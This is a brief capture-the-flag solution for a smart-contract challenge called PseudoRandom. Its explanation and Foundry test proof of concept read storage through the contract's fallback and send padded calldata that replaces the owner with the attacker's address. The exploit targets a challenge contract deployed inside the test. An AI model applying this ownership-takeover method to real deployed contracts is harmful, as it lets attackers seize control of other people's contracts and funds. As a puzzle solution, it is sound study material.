We have to change the owner variable to the hacker address. This is possible via calling fallback() function correctly.
By calling it and beggining the data with "0x3bc5de30" we can get data from the contract's storage.
So to get the value of sig := sload(sload(add(chainid(), caller()))) we just have to get the storage data of it.
Then it stores gets 32 bytes of the calldata starting from 0x24 byte. 36->68 bytes
So we have to add some padding to our data:
sig (4 bytes) + 88 zeros (44 bytes) + new owner address (20 bytes) = 68 bytes

Rekt! ðŸ˜Ž

POC:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/PseudoRandom.sol";

contract PseudoRandomTest is Test {
    string private BSC_RPC = "https://rpc.ankr.com/bsc"; // 56
    string private POLY_RPC = "https://rpc.ankr.com/polygon"; // 137
    string private FANTOM_RPC = "https://rpc.ankr.com/fantom"; // 250
    string private ARB_RPC = "https://rpc.ankr.com/arbitrum"; // 42161
    string private OPT_RPC = "https://rpc.ankr.com/optimism"; // 10
    string private GNOSIS_RPC = "https://rpc.ankr.com/gnosis"; // 100

    address private addr;

    function setUp() external {
        vm.createSelectFork(BSC_RPC);
    }

    function test() external {
        string memory rpc = new string(32);
        assembly {
            // network selection
            let _rpc := sload(
                add(mod(xor(number(), timestamp()), 0x06), BSC_RPC.slot)
            )
            mstore(rpc, shr(0x01, and(_rpc, 0xff)))
            mstore(add(rpc, 0x20), and(_rpc, not(0xff)))
        }

        addr = makeAddr(rpc);

        vm.createSelectFork(rpc);

        vm.startPrank(addr, addr);
        address instance = address(new PseudoRandom());

        // the solution
        uint256 position1;
        address addrHack = addr;
        assembly {
            position1 := add(chainid(), addrHack)
        }
        bytes memory txData1 = abi.encodePacked(bytes4(0x3bc5de30), position1);

        (, bytes memory res) = instance.call(txData1);
        bytes32 position2 = bytes32(res);

        bytes memory txData2 = abi.encodePacked(bytes4(0x3bc5de30), position2);
        (, bytes memory res2) = instance.call(txData2);
        bytes4 sig = bytes4(res2);
        bytes22 padding = 0x0;
        (bool success, ) = instance.call(
            abi.encodePacked(sig, padding, padding, addr)
        );

        assertEq(PseudoRandom(instance).owner(), addr);
    }
}
